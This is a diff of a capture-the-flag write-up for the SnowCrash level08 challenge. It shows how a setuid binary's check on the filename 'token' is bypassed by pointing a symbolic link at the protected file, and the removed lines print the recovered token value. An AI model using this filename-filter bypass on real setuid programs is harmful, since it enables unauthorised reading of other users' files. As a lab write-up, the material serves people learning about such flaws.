@@ -1,22 +1,56 @@
-`ls -l` </br>
-```-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08``` </br>
-```-rw-------  1 flag08 flag08    26 Mar  5  2016 token```
+# Level08
 
-level08 seems to print the content of the file given as the first argument, however we can't read token:
-```You may not access 'token'```
+## Research
+------------------
 
-If we do a `strings` on the level08 binary, we can see that the programs calls strstr and that 'token' is hard written in the code.
-Maybe it won't read anyfile with 'token' in the name. 
+```bash
+level08@SnowCrash:~$ ls -l
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+```
 
-`level08@SnowCrash:~$ ./level08 /tmp/cctoken`</br>
-`You may not access '/tmp/cctoken'`</br>
+```bash
+level08@SnowCrash:~$ ./level08
+./level08 [file to read]
 
-How to make it access and read token through a file not named 'token'?
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+```
+
+```bash
+level08@SnowCrash:~$ strings level08
+[...]
+printf
+strstr
+read
+open
+[...]
+token
+```
+
+We can see that the programs calls strstr and that 'token' is hard written in the code.
+Maybe it won't read anyfile with 'token' in the name.
+
+```bash
+level08@SnowCrash:~$ echo 'hello' > /tmp/hello
+level08@SnowCrash:~$ ./level08 /tmp/hello
+hello
+level08@SnowCrash:~$ ./level08 /tmp/cctoken
+You may not access '/tmp/cctoken'
+```
+The theory seems true: the program will open, read and print anyfile which doesn't have token in its name.
+
+- How to make it access and read `token` through a file not named 'token'?
+
+## Solution
+------------------
 
 https://techterms.com/definition/symbolic_link
 
 We can use symbolic links: </br>
 
-`ln -s ~/token /tmp/non` </br>
-`./level08 /tmp/non` </br>
-gives `quif5eloekouj29ke0vouxean`
+```bash
+level08@SnowCrash:~$ ln -s ~/token /tmp/link
+level08@SnowCrash:~$ ./level08 /tmp/link
+```
+gives the token.
